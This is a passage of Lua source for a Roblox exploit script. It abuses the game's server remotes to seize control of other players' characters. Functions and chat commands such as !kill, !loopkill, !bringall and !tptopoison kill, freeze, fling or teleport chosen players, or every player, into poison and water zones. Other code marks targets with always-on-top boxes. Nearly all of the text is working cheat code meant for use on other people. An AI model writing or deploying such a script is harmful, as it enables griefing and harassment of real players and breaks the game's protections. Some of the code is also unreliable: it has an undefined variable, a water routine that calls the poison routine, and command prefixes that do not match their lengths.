                targetHRP.CFrame = CFrame.new(waterPos)
                for _, prt in pairs(targetChar:GetChildren()) do
                    if prt:IsA("Part") then
                        prt.Velocity = Vector3.new()
                        prt.CanTouch = false
                    end
                end
            else
                for _, prt in pairs(targetChar:GetChildren()) do
                    if prt:IsA("Part") then
                        prt.CFrame = CFrame.new(waterPos)
                        prt.Velocity = Vector3.new()
                        prt.CanTouch = false
                    end
                end
            end
            task.wait()
        end
    end)
    
    task.wait(0)
    if GrabFlag == "Default" then
        Destroy_Line(targetHRP)
    end
    tpTimer = 0
end

blobFreezeLoop = false
 blobFreezeTarget = nil
 TargetPosition = Vector3.new(-483, -32, -125)


function findBlobman()
    local toys = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
    return toys and toys:FindFirstChild("CreatureBlobman") or nil
end

function spawnBlobman()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    SpawnToyRF:InvokeServer("CreatureBlobman", char.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5), Vector3.new(0, -15, 0))
end

function ensureBlobman()
    local b = findBlobman()
    if b then return b end
    spawnBlobman()
    for _ = 1, 30 do
        task.wait(0.01)
        b = findBlobman()
        if b then return b end
    end
    return nil
end

function getBlobman()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = LocalPlayer.Character.Humanoid
        for _, v in pairs(Workspace:GetDescendants()) do
            if v.Name == "BlobmanSeatAndOwnerScript" and v.Parent.Name == "CreatureBlobman" then
                if not humanoid.SeatPart then
                    local seat = v.Parent:FindFirstChildWhichIsA("VehicleSeat")
                    if seat then
                        humanoid.Sit = true
                        seat:Sit(humanoid)
                        task.wait(0.1)
                    end
                end
                if humanoid.SeatPart and humanoid.SeatPart.Parent == v.Parent then
                    return v.Parent
                end
            end
        end
    end
    return nil
end

function isOnBlobman()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = LocalPlayer.Character.Humanoid
        if humanoid.SeatPart and humanoid.SeatPart.Parent and humanoid.SeatPart.Parent.Name == "CreatureBlobman" then
            return true
        end
    end
    return false
end

function getDetector(blob, side)
    local detector = blob:FindFirstChild(side.."Detector")
    local weld = detector and detector:FindFirstChild(side.."Weld")
    return detector, weld
end

function inPlot(player)
    local plots = Workspace:FindFirstChild("PlotItems")
    local playersInPlots = plots and plots:FindFirstChild("PlayersInPlots")
    return playersInPlots and playersInPlots:FindFirstChild(player.Name)
end

function ProcessBlobFreeze(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if not targetPlayer then return false, "Player not found" end
    
    if inPlot(targetPlayer) then return false, "Player is in a plot" end
    
    local targetChar = targetPlayer.Character
    if not targetChar then return false, "Player has no character" end
    
    local blob = ensureBlobman()
    if not blob then return false, "Failed to spawn blobman" end
    
    if not isOnBlobman() then
        local currentBlob = getBlobman()
        if not currentBlob then return false, "Failed to mount blobman" end
        blob = currentBlob
    end
    
    local localChar = LocalPlayer.Character
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    if not localChar or not localChar:FindFirstChild("HumanoidRootPart") or not targetHRP then
        return false, "Failed to get character parts"
    end
    
    localChar.HumanoidRootPart.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 5)
    task.wait(0.3)
    
    local detector, weld = getDetector(blob, "Right")
    if not (detector and weld) then return false, "Failed to get blobman parts" end
    
    local currentGrab = blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
    if not currentGrab then return false, "Failed to get CreatureGrab" end
    
    currentGrab:FireServer(blob.RightDetector, targetHRP, weld)
    task.wait(0.001)
    
    for _, part in ipairs(targetChar:GetChildren()) do
        if part:IsA("BasePart") then
            blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(weld, part)
            part.AssemblyLinearVelocity = Vector3.new(0, 15, 0)
            blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(weld, part)
        end
    end
    
    local drop = blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
    if drop then
        for _, part in ipairs(targetChar:GetDescendants()) do
            if part:IsA("Weld") or part:IsA("BallSocketConstraint") then
                drop:FireServer(part, part)
            end
        end
    end
    
    task.wait(0.1)
    
    if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
        targetChar.HumanoidRootPart.CFrame = CFrame.new(TargetPosition)
        targetChar.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
        targetChar.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
        
        for _, part in pairs(targetChar:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Velocity = Vector3.zero
                part.RotVelocity = Vector3.zero
            end
        end
        
        task.wait(0.5)
        
        if targetChar:FindFirstChild("HumanoidRootPart") then
            targetChar.HumanoidRootPart.Anchored = true
        end
    end
    
    return true, "Success"
end

function BlobFreezeLoopFunc()
    while blobFreezeLoop do
        if blobFreezeTarget then
            ProcessBlobFreeze(blobFreezeTarget)
        end
        task.wait(0.5)
    end
end

 heartHighRun = false
heartTarget = LocalPlayer.Name 
heartConnection = nil
 heartToy = nil

function ToggleHeartSparkler(targetName, enable)
    heartHighRun = enable
    
    if targetName then
        heartTarget = targetName
    end
    
    if enable then
        task.spawn(function()
            local targetPlayer = Players:FindFirstChild(heartTarget)
            if not targetPlayer then
                heartTarget = LocalPlayer.Name
                targetPlayer = LocalPlayer
            end
            
            if not targetPlayer.Character then return end
            local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            pcall(function()
                SpawnToyRF:InvokeServer("FireworkSparkler", hrp.CFrame * CFrame.new(0, 50, 0), Vector3.zero)
            end)

            local folderName = LocalPlayer.Name .. "SpawnedInToys"
            local folder = Workspace:WaitForChild(folderName, 5)
            if not folder then return end
            
            heartToy = folder:WaitForChild("FireworkSparkler", 5)
            if not heartToy then return end
            
            local part = heartToy:FindFirstChild("Handle") or heartToy:FindFirstChildWhichIsA("BasePart")
            if not part then return end

            task.wait(0.2)
            
            for _, v in pairs(heartToy:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Anchored = false
                    v.CanCollide = false
                    v.Massless = true
                end
            end
            part:BreakJoints()

            local bp = Instance.new("BodyPosition")
            bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bp.P = 20000
            bp.D = 500
            bp.Parent = part

            local bg = Instance.new("BodyGyro")
            bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
            bg.P = 3000
            bg.CFrame = CFrame.new()
            bg.Parent = part

            local t = 0
            
            if heartConnection then heartConnection:Disconnect() end
            
            heartConnection = RunService.Heartbeat:Connect(function(dt)
                if not heartHighRun or not part or not part.Parent then
                    if heartConnection then heartConnection:Disconnect() end
                    if heartToy then pcall(function() heartToy:Destroy() end) end
                    return
                end

                local targetPlayer = Players:FindFirstChild(heartTarget)
                if not targetPlayer or not targetPlayer.Character then 
                    heartTarget = LocalPlayer.Name
                    targetPlayer = LocalPlayer
                end
                
                local currentHrp = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not currentHrp then return end

                pcall(function()
                    RemoteSetNetworkOwner:FireServer(part, part.CFrame)
                end)

                t = t + (8 * dt)
                
                local scale = 1.5
                local x = 16 * math.sin(t)^3
                local y = 13 * math.cos(t) - 5 * math.cos(2*t) - 2 * math.cos(3*t) - math.cos(4*t)

                local relPos = Vector3.new(x * scale, (y * scale) + 3, 0) 
                local finalPos = currentHrp.CFrame:PointToWorldSpace(relPos)

                bp.Position = finalPos
                bg.CFrame = currentHrp.CFrame
            end)
        end)
    else
        if heartConnection then 
            heartConnection:Disconnect() 
            heartConnection = nil 
        end
        if heartToy then 
            pcall(function() heartToy:Destroy() end) 
            heartToy = nil 
        end
    end
end

tptopoisonLoop = false
 tptopoisonTarget = nil
 PoisonPosition = Vector3.new(36, -68, 269)

function TPToPoison(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    if not targetPlayer then return false, "Player not found" end
    
    local targetChar = targetPlayer.Character
    if not targetChar then return false, "Player has no character" end
    
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local targetHum = targetChar:FindFirstChild("Humanoid")
    if not targetHRP or not targetHum then return false, "Invalid character" end
    
    if targetHum.Health <= 0 then return false, "Player is dead" end
    if targetPlayer.InPlot.Value then return false, "Player in safe zone" end
    
    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myHRP = mychar:FindFirstChild("HumanoidRootPart")
    local myHum = mychar:FindFirstChild("Humanoid")
    if not myHRP or not myHum then return false, "Your character invalid" end
    
    local BackUp = myHRP.CFrame
    local success = false

for i = 1, 30 do
        if not targetHRP or not targetHRP.Parent then break end
        if myHum.Health <= 0 then break end
        
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, -3, 0)
        grab(targetHRP)
        
        if targetChar.Head:FindFirstChild("PartOwner") and targetChar.Head.PartOwner.Value == LocalPlayer.Name then
            success = true
            break
        end
        
        task.wait(0.1)
    end
    
    if not success then
        myHRP.CFrame = BackUP
        return false, "Could not grab player"
    end

myHRP.CFrame = BackUp
    
    task.defer(function()
        local startTime = tick()
        while targetChar and targetChar.Parent and targetChar.Head:FindFirstChild("PartOwner") and 
              targetChar.Head.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
            targetHRP.CFrame = CFrame.new(PoisonPosition)
            targetHRP.Velocity = Vector3.new()
            task.wait()
        end
        RemoteDestroyGrabLine:FireServer(targetHRP)
    end)
    
    return true, "Success"
end


function TPPoisonLoopFunc()
    while tptopoisonLoop do
        if tptopoisonTarget then
            TPToPoison(tptopoisonTarget)
        end
        task.wait(1)
    end
end

PoisonPosition = Vector3.new(36, -68, 269)
BringAllActive = false
BringAllLoopActive = false


function BringPlayerToPoison(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local targetChar = targetPlayer.Character
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local targetHum = targetChar:FindFirstChild("Humanoid")
    
    if not targetHRP or not targetHum then return false end
    
    if targetHum.Health <= 0 then return false end
    if targetPlayer.InPlot.Value then return false end
    
    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myHRP = mychar:FindFirstChild("HumanoidRootPart")
    local myHum = mychar:FindFirstChild("Humanoid")
    
    if not myHRP or not myHum then return false end
    
    local BackUp = myHRP.CFrame
    local success = false
    
    for i = 1, 45 do
        if not targetHRP or not targetHRP.Parent then break end
        if myHum.Health <= 0 then break end
        
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, -3, 0)
        grab(targetHRP)
        
        if targetChar.Head:FindFirstChild("PartOwner") and targetChar.Head.PartOwner.Value == LocalPlayer.Name then
            success = true
            break
        end
        
        task.wait(0)
    end
    
    if not success then
        myHRP.CFrame = BackUp
        return false
    end
    
    myHRP.CFrame = BackUp
    
    task.defer(function()
        local startTime = tick()
        while targetChar and targetChar.Parent and targetChar.Head:FindFirstChild("PartOwner") and 
              targetChar.Head.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
            
            targetHRP.CFrame = CFrame.new(PoisonPosition)
            targetHRP.Velocity = Vector3.new()
            
            task.wait()
        end
        RemoteDestroyGrabLine:FireServer(targetHRP)
    end)
    
    return true
end

function BringAllToPoison()
    local successCount = 0
    local failCount = 0
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local success = BringPlayerToPoison(player.Name)
            if success then
                successCount = successCount + 1
            else
                failCount = failCount + 1
            end
            task.wait(0)
        end
    end
    
    return successCount, failCount
end

function BringAllLoop()
    while BringAllLoopActive do
        BringAllToPoison()
        task.wait(0) 
    end
end

WaterPosition = Vector3.new(327, 26, 699)
BringAllActive2 = false
BringAllLoop2Active = false


function BringPlayerToWater(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer or not targetPlayer.Character then return false end
    
    local targetChar = targetPlayer.Character
    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
    local targetHum = targetChar:FindFirstChild("Humanoid")
    
    if not targetHRP or not targetHum then return false end
    
    if targetHum.Health <= 0 then return false end
    if targetPlayer.InPlot.Value then return false end
    
    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myHRP = mychar:FindFirstChild("HumanoidRootPart")
    local myHum = mychar:FindFirstChild("Humanoid")
    
    if not myHRP or not myHum then return false end
    
    local BackUp = myHRP.CFrame
    local success = false
    
    for i = 1, 45 do
        if not targetHRP or not targetHRP.Parent then break end
        if myHum.Health <= 0 then break end
        
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, -3, 0)
        grab(targetHRP)
        
        if targetChar.Head:FindFirstChild("PartOwner") and targetChar.Head.PartOwner.Value == LocalPlayer.Name then
            success = true
            break
        end
        
        task.wait(0)
    end
    
    if not success then
        myHRP.CFrame = BackUp
        return false
    end
    
    myHRP.CFrame = BackUp
    
    task.defer(function()
        local startTime = tick()
        while targetChar and targetChar.Parent and targetChar.Head:FindFirstChild("PartOwner") and 
              targetChar.Head.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
            
            targetHRP.CFrame = CFrame.new(PoisonPosition)
            targetHRP.Velocity = Vector3.new()
            
            task.wait()
        end
        RemoteDestroyGrabLine:FireServer(targetHRP)
    end)
    
    return true
end

function BringAllToWater()
    local successCount = 0
    local failCount = 0
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local success = BringPlayerToPoison(player.Name)
            if success then
                successCount = successCount + 1
            else
                failCount = failCount + 1
            end
            task.wait(0)
        end
    end
    
    return successCount, failCount
end

function BringAllLoop2()
    while BringAllLoop2Active do
        BringAllToWater()
        task.wait(0) 
    end
end

function Destroy_Line(Part)
    if not Part then return end
    for _, v in pairs(Part.Parent:GetDescendants()) do
        if v.Name == "PartOwner" then
            RemoteDestroyGrabLine:FireServer(v.Parent)
        end
    end
end

 PCldEnabled = {}
 PCldBoxes = {}

function CreatePCld(player)
    if PCldBoxes[player] then return end
    
    local character = player.Character
    if not character then return end
    
    local hrp = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
    if not hrp then return end
    
    local box = Instance.new("BoxHandleAdornment")
    box.Name = player.Name .. "_PCld"
    box.Adornee = hrp
    box.AlwaysOnTop = true
    box.ZIndex = 10
    box.Size = Vector3.new(4, 6, 2)
    box.Color3 = Color3.fromRGB(255, 0, 255) -- Magenta
    box.Transparency = 0.3
    box.Parent = hrp
    
    local billboard = Instance.new("BillboardGui")
    billboard.Name = player.Name .. "_PCld_Text"
    billboard.Adornee = hrp
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 4, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = hrp
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "[PCld] " .. player.Name
    textLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextSize = 16
    textLabel.TextStrokeTransparency = 0.3
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.Parent = billboard
    
    local outline = Instance.new("SelectionBox")
    outline.Name = player.Name .. "_PCld_Outline"
    outline.Adornee = hrp
    outline.Color3 = Color3.fromRGB(255, 0, 255)
    outline.Transparency = 0.7
    outline.LineThickness = 0.05
    outline.Parent = hrp
    
    PCldBoxes[player] = {box = box, billboard = billboard, outline = outline}
end

function RemovePCld(player)
    if PCldBoxes[player] then
        if PCldBoxes[player].box then
            PCldBoxes[player].box:Destroy()
        end
        if PCldBoxes[player].billboard then
            PCldBoxes[player].billboard:Destroy()
        end
        if PCldBoxes[player].outline then
            PCldBoxes[player].outline:Destroy()
        end
        PCldBoxes[player] = nil
    end
end

function UpdatePCld()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            if table.find(PCldEnabled, player.Name) then
                if player.Character then
                    CreatePCld(player)
                else
                    RemovePCld(player)
                end
            else
                RemovePCld(player)
            end
        end
    end
end


function TogglePCld(playerName, enable)
    local player = Players:FindFirstChild(playerName)
    if not player then return false, "Player not found" end
    
    if enable then
        if not table.find(PCldEnabled, playerName) then
            table.insert(PCldEnabled, playerName)
            if player.Character then
                CreatePCld(player)
            end
            return true, "PCld enabled for " .. playerName
        end
    else
        local index = table.find(PCldEnabled, playerName)
        if index then
            table.remove(PCldEnabled, index)
            RemovePCld(player)
            return true, "PCld disabled for " .. playerName
        end
    end
    return false
end

task.spawn(function()
    while true do
        UpdatePCld()
        task.wait(0.5)
    end
end)


function MonitorPlayerRespawns()
    local connections = {}
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local conn = player.CharacterAdded:Connect(function()
                if table.find(PCldEnabled, player.Name) then
                    task.wait(0.5) 
                    CreatePCld(player)
                end
            end)
            table.insert(connections, conn)
        end
    end
    
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            local conn = player.CharacterAdded:Connect(function()
                if table.find(PCldEnabled, player.Name) then
                    task.wait(0.5)
                    CreatePCld(player)
                end
            end)
            table.insert(connections, conn)
        end
    end)
    
    Players.PlayerRemoving:Connect(function(player)
        RemovePCld(player)
    end)
end

task.spawn(MonitorPlayerRespawns)

CameraAnchor = {}
CameraAnchor.__index = CameraAnchor
function CameraAnchor.new() return setmetatable({}, CameraAnchor) end
function CameraAnchor:attach(cf)
    self:detach()
    p = Instance.new("Part")
    p.Name, p.Size, p.Transparency, p.Anchored, p.CanCollide, p.CFrame, p.Parent =
        "CameraAnchor", Vector3.new(0.2, 0.2, 0.2), 1, true, false, cf, Workspace
    self.part = p
    cam = Workspace.CurrentCamera
    cam.CameraType = Enum.CameraType.Custom
    cam.CameraSubject = p
end
function CameraAnchor:detach()
    if self.part then self.part:Destroy() self.part = nil end
    cam = Workspace.CurrentCamera
    char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        cam.CameraSubject = char.Humanoid
    else
        cam.CameraType = Enum.CameraType.Custom
        cam.CameraSubject = cam
    end
end
cameraAnchor = CameraAnchor.new()

function saveOriginalPosAttr()
    char = LocalPlayer.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        char:SetAttribute("OriginalPosition", hrp:GetPivot())
    end
end

function getOriginalPosAttr()
    char = LocalPlayer.Character
    return char and char:GetAttribute("OriginalPosition") or nil
end

function initCharAttrs()
    char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char:SetAttribute("OriginalPosition", char.HumanoidRootPart:GetPivot())
        char:SetAttribute("SavingOriginalPos", false)
    end
end

function scheduleReturnHome()
    originalPos = getOriginalPosAttr()
    if not originalPos then return end
    
    conn = nil
    conn = RunService.Heartbeat:Connect(function()
        char = LocalPlayer.Character
        hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp:PivotTo(originalPos)
            if getgenv().originalFallenHeight then
                Workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
            end
            char:SetAttribute("SavingOriginalPos", false)
        end
        cameraAnchor:detach()
        conn:Disconnect()
    end)
end

function modifyTarget(root, hum)
    if not (root and hum) or hum.Health <= 0 then return end
    hum.Sit = false
    hum:ChangeState(Enum.HumanoidStateType.Running)
    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum:ChangeState(Enum.HumanoidStateType.GettingUp)

    plr = Players:GetPlayerFromCharacter(hum.Parent)
    if plr and plr:FindFirstChild("IsHeld") then plr.IsHeld.Value = false end
    rag = hum:FindFirstChild("Ragdolled")
    if rag then rag.Value = false end

    bv, bav = Instance.new("BodyVelocity"), Instance.new("BodyAngularVelocity")
    bv.MaxForce = Vector3.new(1e7, -1e7, 1e7)
    bv.P = 100
    bv.Velocity = Vector3.new(math.random(-500, 50), -50, math.random(-50, 50))
    bav.MaxTorque = Vector3.new(-1e7, -1e7, -1e7)
    bav.P = 1e6
    bav.AngularVelocity = Vector3.new(math.random(-500, 300), math.random(-300, 300), math.random(-500, 500))
    bv.Parent, bav.Parent = root, root

    hum.BreakJointsOnDeath = false
    hum:ChangeState(Enum.HumanoidStateType.Dead)
    hum.RigType = Enum.HumanoidRigType.R15

    task.delay(0.1, function()
        if bv.Parent then bv:Destroy() end
        if bav.Parent then bav:Destroy() end
    end)
end

function performKill()
    if not SelectedPlayer then return end
    
    target = Players:FindFirstChild(SelectedPlayer)
    tChar = target and target.Character
    tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
    tHum = tChar and tChar:FindFirstChild("Humanoid")
    tHead = tChar and tChar:FindFirstChild("Head")
    
    if not (target and tRoot and tHum and tHead) then return end
    if isTooHigh(target) then return end
    if target:FindFirstChild("InPlot") and target.InPlot.Value then return end
    if tHum:GetState() == Enum.HumanoidStateType.Dead then return end

    char = LocalPlayer.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not (char and hrp) then return end

    if not char:GetAttribute("SavingOriginalPos") then
        saveOriginalPosAttr()
    end
    char:SetAttribute("SavingOriginalPos", true)

    getgenv().originalFallenHeight = Workspace.FallenPartsDestroyHeight
    Workspace.FallenPartsDestroyHeight = 0/0

    originalPos = getOriginalPosAttr()
    if originalPos then
        cameraAnchor:attach(originalPos)
    end

    desiredCFrame = CFrame.new(tRoot.Position + TELEPORT_OFFSET)
    hrp:PivotTo(desiredCFrame)

    setNoCollideChar(tChar)
    
    for i = 5, 10 do
        RemoteSetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
        task.wait()
    end
    
    RemoteDestroyGrabLine:FireServer(tRoot)
    task.wait()

    if tHead:FindFirstChild("PartOwner") and tHead.PartOwner.Value == LocalPlayer.Name then
        modifyTarget(tRoot, tHum)
    end

    scheduleReturnHome()
end

function StartLoopKill()
    if KillHB then KillHB:Disconnect() end
    LoopKillOn = true
    KillHB = RunService.Heartbeat:Connect(function()
        if LoopKillOn then
            performKill()
        end
    end)
end

function StopLoopKill()
    LoopKillOn = false
    if KillHB then KillHB:Disconnect() KillHB = nil end
    cameraAnchor:detach()
end

function FindPlayerByPartialName(partial)
    partial = string.lower(partial)
    for _, player in pairs(Players:GetPlayers()) do
        playerNameLower = string.lower(player.Name)
        playerDisplayLower = string.lower(player.DisplayName)
        if string.find(playerNameLower, partial, 1, true) or string.find(playerDisplayLower, partial, 1, true) then
            return player.Name
        end
    end
    return nil
end


LocalPlayer.Chatted:Connect(function(message)
    if IsAllowed(LocalPlayer.Name) then
        msgLower = string.lower(message)
        args = string.split(message, " ")
        
        if string.sub(msgLower, 1, 9) == "!blobkick" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                local success = BlobKickPlayer(targetName, false)
                Rayfield:Notify({
                    Title = success and "Blobkick Success" or "Blobkick Failed",
                    Content = success and "Blobkicked " .. targetName or "Failed to blobkick " .. targetName,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
            
             elseif string.sub(msgLower, 1, 9) == "!bringall" then
            Rayfield:Notify({
                Title = "Bring All Started",
                Content = "Bringing all players to poison...",
                Duration = 3,
                Image = 7743876054,
            })
            
            local successCount, failCount = BringAllToPoison()
            
            Rayfield:Notify({
                Title = "Bring All Complete",
                Content = "Success: " .. successCount .. " | Failed: " .. failCount,
                Duration = 5,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 13) == "!loopbringall" then
            BringAllLoopActive = true
            task.spawn(BringAllLoop)
            Rayfield:Notify({
                Title = "Loop Bring All Started",
                Content = "Loop bringing all players to poison",
                Duration = 3,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 15) == "!unloopbringall" then
            BringAllLoopActive = false
            Rayfield:Notify({
                Title = "Loop Bring All Stopped",
                Content = "Stopped loop bringing all",
                Duration = 3,
                Image = 7743876054,
            })
        
       elseif string.sub(msgLower, 1, 5) == "!kill" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                performKill()
                Rayfield:Notify({
                    Title = "Command Executed",
                    Content = "Killing " .. targetName,
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        elseif string.sub(msgLower, 1, 9) == "!loopkill" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                SelectedPlayer = targetName
                StartLoopKill()
                Rayfield:Notify({
                    Title = "Command Executed",
                    Content = "Loop killing " .. targetName,
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        elseif string.sub(msgLower, 1, 11) == "!unloopkill" then
            StopLoopKill()
            Rayfield:Notify({
                Title = "Command Executed",
                Content = "Stopped loop kill",
                Duration = 3,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 5) == "!pcld" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                local success, message = TogglePCld(targetName, true)
                Rayfield:Notify({
                    Title = success and "PCld Enabled" or "PCld Error",
                    Content = message,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 7) == "!nopcld" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                local success, message = TogglePCld(targetName, false)
                Rayfield:Notify({
                    Title = success and "PCld Disabled" or "PCld Error",
                    Content = message,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 9) == "!bringalltowater" then
            Rayfield:Notify({
                Title = "Bring All Started",
                Content = "Bringing all players to water...",
                Duration = 3,
                Image = 7743876054,
            })
            
            local successCount, failCount = BringAllToWater()
            
            Rayfield:Notify({
                Title = "Bring All Complete",
                Content = "Success: " .. successCount .. " | Failed: " .. failCount,
                Duration = 5,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 13) == "!loopbringtowaterall" then
            BringAllLoop2Active = true
            task.spawn(BringAllLoop2)
            Rayfield:Notify({
                Title = "Loop Bring All Started",
                Content = "Loop bringing all players to water",
                Duration = 3,
                Image = 7743876054,
            })
        
        elseif string.sub(msgLower, 1, 15) == "!unloopbringtowaterall" then
            BringAllLoop2Active = false
            Rayfield:Notify({
                Title = "Loop Bring All Stopped",
                Content = "Stopped loop bringing all",
                Duration = 3,
                Image = 7743876054,
            })

elseif string.sub(msgLower, 1, 6) == "!heart" then
            local targetName = LocalPlayer.Name 
            
            if #args >= 2 then
                targetName = FindPlayerByPartialName(args[2])
                if not targetName then
                    Rayfield:Notify({
                        Title = "Error",
                        Content = "Player not found: " .. args[2],
                        Duration = 3,
                        Image = 7743878857,
                    })
                    return
                end
            end
            
            ToggleHeartSparkler(targetName, not heartHighRun)
            Rayfield:Notify({
                Title = "Heart " .. (not heartHighRun and "Enabled" or "Disabled"),
                Content = "Heart sparkler " .. (not heartHighRun and "activated on " .. targetName or "deactivated"),
                Duration = 3,
                Image = 7743876054,
            })
        elseif string.sub(msgLower, 1, 9) == "!loopheart" then
            local targetName = LocalPlayer.Name
            
            if #args >= 2 then
                targetName = FindPlayerByPartialName(args[2])
                if not targetName then
                    Rayfield:Notify({
                        Title = "Error",
                        Content = "Player not found: " .. args[2],
                        Duration = 3,
                        Image = 7743878857,
                    })
                    return
                end
            end
            
            if not heartHighRun then
                ToggleHeartSparkler(targetName, true)
                Rayfield:Notify({
                    Title = "Heart Enabled",
                    Content = "Heart sparkler activated on " .. targetName .. " (loop)",
                    Duration = 3,
                    Image = 7743876054,
                })
            end
        elseif string.sub(msgLower, 1, 11) == "!unloopheart" then
            if heartHighRun then
                ToggleHeartSparkler(nil, false)
                Rayfield:Notify({
                    Title = "Heart Disabled",
                    Content = "Heart sparkler deactivated",
                    Duration = 3,
                    Image = 7743876054,
                })
            end
        elseif string.sub(msgLower, 1, 11) == "!tptopoison" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                local success, message = TPToPoison(targetName)
                Rayfield:Notify({
                    Title = success and " TP Poison Success" or " TP Poison Failed",
                    Content = success and "TP " .. targetName .. " to poison" or "Failed: " .. message,
                    Duration = 3,
                    Image = success and 7743876054 or 7743878857,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
            elseif string.sub(msgLower, 1, 15) == "!looptptopoison" and #args >= 2 then
            targetName = FindPlayerByPartialName(args[2])
            if targetName then
                tptopoisonTarget = targetName
                tptopoisonLoop = true
                task.spawn(TPPoisonLoopFunc)
                Rayfield:Notify({
                    Title = "Loop TP Poison Started",
                    Content = "Loop TP " .. targetName .. " to poison",
                    Duration = 3,
                    Image = 7743876054,
                })
            else
                Rayfield:Notify({
                    Title = "Error",
                    Content = "Player not found: " .. args[2],
                    Duration = 3,
                    Image = 7743878857,
                })
            end
        
        elseif string.sub(msgLower, 1, 17) == "!unlooptptopoison" then
            tptopoisonLoop = false
